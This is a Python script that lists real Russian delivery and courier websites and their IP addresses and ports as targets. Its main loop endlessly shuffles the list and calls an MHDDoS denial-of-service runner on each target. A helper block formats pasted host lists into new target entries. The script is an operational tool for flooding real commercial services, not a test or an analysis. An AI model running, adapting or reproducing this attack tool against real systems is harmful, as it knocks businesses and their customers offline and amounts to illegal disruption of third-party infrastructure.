#!/usr/bin/env python3

import random

from utils import setup_logger, run_mhddos, Args


ARGS_LIST = list({
    # https://express.dhl.ru
    # express.dhl.ru
    Args.https("express.dhl.ru"),
    Args.https("185.165.123.50:443"),
    Args.https("217.73.60.2:443"),
    # https://ponyexpress.ru
    # ponyexpress.ru
    Args.https("ponyexpress.ru"),
    Args.http("185.10.63.194:80"),
    Args.https("185.10.63.194:443"),
    Args.http("82.146.44.236:80"),
    Args.https("82.146.44.236:443"),
    Args.http("95.163.180.40:80"),
    Args.https("95.163.180.40:443"),
    Args.http("185.10.63.192:80"),
    Args.https("185.10.63.192:443"),
    # https://dostavista.ru
    # dostavista.ru
    Args.https("dostavista.ru"),
    Args.http("185.71.67.112:80"),
    Args.https("185.71.67.112:443"),
    Args.http("185.215.4.10:80"),
    Args.https("185.215.4.10:443"),
    # https://delivery-club.ru
    # delivery-club.ru
    Args.https("delivery-club.ru"),
    Args.http("5.61.236.230:80"),
    Args.https("5.61.236.230:443"),
    Args.http("128.140.175.200:80"),
    Args.https("128.140.175.200:443"),
    Args.http("128.140.175.205:80"),
    Args.https("128.140.175.205:443"),
    # https://dotochki.com
    # dotochki.com
    Args.https("dotochki.com"),
    Args.http("195.42.165.13:80"),
    Args.https("195.42.165.13:443"),
    # https://broniboy.ru
    # broniboy.ru
    Args.https("broniboy.ru"),
    Args.http("185.137.235.138:80"),
    Args.https("185.137.235.138:443"),
    Args.http("82.202.251.98:80"),
    Args.https("82.202.251.98:443"),
})

zh = """
https://express.dhl.ru 
185.165.123.50 (443/HTTP)
217.73.60.2 (443/HTTP)

https://ponyexpress.ru 
185.10.63.194 (80/HTTP , 443/HTTP)
82.146.44.236 (80/HTTP , 443/HTTP)
95.163.180.40 (80/HTTP , 443/HTTP)
185.10.63.192 (80/HTTP , 443/HTTP)

https://dostavista.ru 
185.71.67.112 (80/HTTP , 443/HTTP)
185.215.4.10 (80/HTTP , 443/HTTP)

https://delivery-club.ru 
5.61.236.230 (80/HTTP , 443/HTTP)
128.140.175.200 (80/HTTP , 443/HTTP)
128.140.175.205 (80/HTTP , 443/HTTP)

https://dotochki.com 
195.42.165.13 (80/HTTP , 443/HTTP)

https://broniboy.ru 
185.137.235.138 (80/HTTP , 443/HTTP)
82.202.251.98 (80/HTTP , 443/HTTP)
""".lower().replace("443/http", "443/https")

if zh.strip():
    strip_filter = lambda xs: filter(None, (x.strip() for x in xs))
    for l in strip_filter(zh.splitlines()):
        if l.startswith("https://"):
            print(f"# {l}")
            l = l[8:]
            print(f"# {l}")
            print(f"Args.https(\"{l}\"),")
            continue
        if " " not in l:
            continue
        host, ports = l.strip().split(" ", 1)
        ports = ports[1: -1].split(",")
        for port in strip_filter(ports):
            p, m = port.split("/")
            if m != "udp":
                print(f'Args.{m}("{host}:{p}"),')
    exit(10)

if __name__ == "__main__":
    logger = setup_logger("ProxyLoop")
    logger.info("Number of targets: %d", len(ARGS_LIST))
    while True:
        random.shuffle(ARGS_LIST)
        for args in ARGS_LIST:
            run_mhddos(logger, args)
